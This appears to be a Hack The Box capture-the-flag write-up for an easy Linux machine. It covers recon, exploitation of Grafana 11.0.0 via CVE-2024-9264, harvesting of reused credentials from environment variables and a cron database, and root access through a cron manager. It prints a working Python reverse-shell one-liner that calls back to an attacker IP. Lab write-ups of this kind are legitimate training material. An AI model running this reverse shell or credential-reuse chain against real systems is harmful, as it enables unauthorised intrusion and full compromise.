---
title: Planning
date: 2025-07-15
description: An easy Linux machine where a vulnerable Grafana 11.0.0 instance leads to Docker access, credential reuse for host access, and root compromise through a cron management interface.
tags:
  - htb
  - Easy
  - Linux
---


# Initial Recon

```bash
# Nmap 7.94SVN scan initiated Sat Jul 12 14:55:01 2025 as: /usr/lib/nmap/nmap -p22,80 -A -oN scan_results.txt 10.10.11.68
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.53s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   567.79 ms 10.10.14.1
2   567.88 ms planning.htb (10.10.11.68)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 12 14:56:36 2025 -- 1 IP address (1 host up) scanned in 95.16 seconds

```


We then fuzzed for virtual hosts:

```bash
ffuf -c -u http://planning.htb/ -H "HOST: FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -fc 301
```

This uncovered the `grafana.planning.htb` subdomain.

# User

## Grafana

The Grafana instance was running **v11.0.0**. This version is affected by **CVE-2024-9264**, a critical vulnerability in Grafana's SQL Expressions functionality that can lead to command injection and RCE.

Exploit reference: `https://github.com/nollium/CVE-2024-9264`

Using the provided credentials, we exploited Grafana and landed inside the Docker container.

## Container Access

The container environment exposed configured credentials through `env`:

```text
enzo : RioTecRANDEntANT!
```

With these credentials, we authenticated to the host and captured the **user flag**.

# Root

The host also exposed services on ports **3306** and **8000**.

## Credential Hunting

We searched `/var/www/web` for MySQL credentials and found:

```text
root : EXTRapHY
```

We attempted to use these credentials against MySQL after tunneling, but authentication failed.

Next, we inspected the cron database:

```bash
cat /opt/crontabs/crontab.db
```

This revealed another password. Reusing it with the `root` account allowed us to authenticate to the cron management application running on port `8000` after tunneling the service.

## Privilege Escalation

The cron management interface allowed us to create and execute scheduled jobs with **root** privileges.

We configured a job containing the following reverse shell:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

After selecting **Run Now**, the job executed with root privileges and connected back to our listener.

Gained `root`
